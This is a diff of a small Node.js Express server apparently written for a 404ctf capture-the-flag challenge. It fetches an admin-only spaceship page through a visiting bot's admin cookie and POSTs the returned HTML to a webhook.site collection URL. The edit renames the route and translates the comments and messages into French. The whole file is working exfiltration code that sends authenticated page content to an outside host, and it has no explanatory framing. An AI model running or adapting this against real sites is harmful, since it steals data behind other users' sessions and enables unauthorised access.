@@ -1,38 +1,36 @@
-
 const express = require('express');
 const fetch = require('node-fetch');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Replace with your webhook URL
+// Ton webhook.site
 const WEBHOOK_URL = "https://webhook.site/714d78b3-a2b4-46a1-842f-0f5dcfda846a";
 
-app.get('/', async (req, res) => {
-  const targetUrl = "http://spacefleetcommand.404ctf.fr/spaceship/3";
+app.get('/redirect', async (req, res) => {
+  const targetUrl = 'http://spacefleetcommand.404ctf.fr/spaceship/3';
 
   try {
     const response = await fetch(targetUrl, {
       headers: {
-        // The admin cookie will be set by the bot — do NOT override it here.
+        // Ne change rien ici ! Le bot aura déjà le cookie admin.
       }
     });
 
-    const text = await response.text();
+    const html = await response.text();
 
-    // Exfiltrate the result to your webhook
     await fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'text/plain' },
-      body: text
+      body: html
     });
 
-    res.send("<h1> Bot visited, exfiltration attempted!</h1>");
+    res.send('✅ Bot exfiltration réussie.');
   } catch (err) {
-    console.error("Fetch or exfiltration failed:", err);
-    res.status(500).send("Error fetching or sending data.");
+    console.error('[!] Erreur exfiltration:', err);
+    res.status(500).send('Erreur serveur.');
   }
 });
 
 app.listen(port, () => {
-  console.log(`[*] Exfiltration server running on port ${port}`);
+  console.log(`[*] Serveur en écoute sur port ${port}`);
 });
